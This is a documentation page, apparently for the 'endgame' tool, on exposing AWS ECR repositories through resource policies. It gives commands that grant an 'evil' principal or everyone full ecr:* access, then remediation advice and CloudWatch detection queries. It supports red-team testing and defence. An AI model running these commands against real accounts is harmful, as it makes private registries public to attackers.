# Elastic Container Registries (ECR)

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

expose --service ecr --name test-resource-exposure
```

* Alternatively, to expose the resource using the AWS CLI:

Create a file named `ecr-policy.json` with the following contents:

```json
{
    "Version" : "2008-10-17",
    "Statement" : [
        {
            "Sid" : "allow public pull",
            "Effect" : "Allow",
            "Principal" : "*",
            "Action" : [
                "ecr:*"
            ]
        }
    ]
}
```

Then run the following from the victim account:

```bash
aws ecr set-repository-policy --repository-name test-resource-exposure --policy-text file://ecr-policy.json
```

* To view the contents of the exposed resource policy, run the following:

```bash
aws ecr get-repository-policy \
    --repository-name test-resource-exposure
```

* Observe that the contents match the example shown below.


## Example

The policy shown below shows a policy that grants access to Principal `*`. If the output contains `*` in Principal, that means the ECR repository is public. If the Principal contains just an account ID, that means it is shared with another account.

```json
{
    "registryId": "111122223333",
    "repositoryName": "test-resource-exposure",
    "policyText": "{\n  \"Version\" : \"2008-10-17\",\n  \"Statement\" : [ {\n    \"Sid\" : \"allow public pull\",\n    \"Effect\" : \"Allow\",\n    \"Principal\" : \"*\",\n    \"Action\" : \"ecr:*\"\n  } ]\n}"
}
```

## Exploitation

```
TODO
```

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Leverage Strong Resource-based Policies**: Follow the resource-based policy recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#leverage-strong-resource-based-policies)
* **Trusted Accounts Only**: Ensure that ECR Repositories are only shared with trusted accounts, and that the trusted accounts truly need access to the ECR Repository.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your ECR Repositories**: Tightly control access to the following IAM actions:
      - [ecr:SetRepositoryPolicy](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_SetRepositoryPolicy.html): _Grants permission to apply a repository policy on a specified repository to control access permissions_
      - [ecr:DeleteRepositoryPolicy](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_DeleteRepositoryPolicy.html): _Grants permission to delete the repository policy from a specified repository_
      - [ecr:GetRepositoryPolicy](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_GetRepositoryPolicy.html): _Grants permission to retrieve the repository policy for a specified repository_
      - [ecr:DescribeRepositories](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_DescribeRepositories.html): _Grants permission to describe image repositories in a registry_
      - [ecr:PutRegistryPolicy](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_PutRegistryPolicy.html): _Grants permission to update the registry policy_
      - [ecr:DeleteRegistryPolicy](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_DeleteRegistryPolicy.html): _Grants permission to delete the registry policy_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='ecr.amazonaws.com' and (eventName='SetRepositoryPolicy' or eventName='DeleteRepositoryPolicy' 
or eventName='PutRegistryPolicy' or eventName='DeleteRegistryPolicy') 
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='ecr.amazonaws.com' and (eventName='SetRepositoryPolicy' and responseElements.policyText like 'Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [set-repository-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ecr/set-repository-policy.html)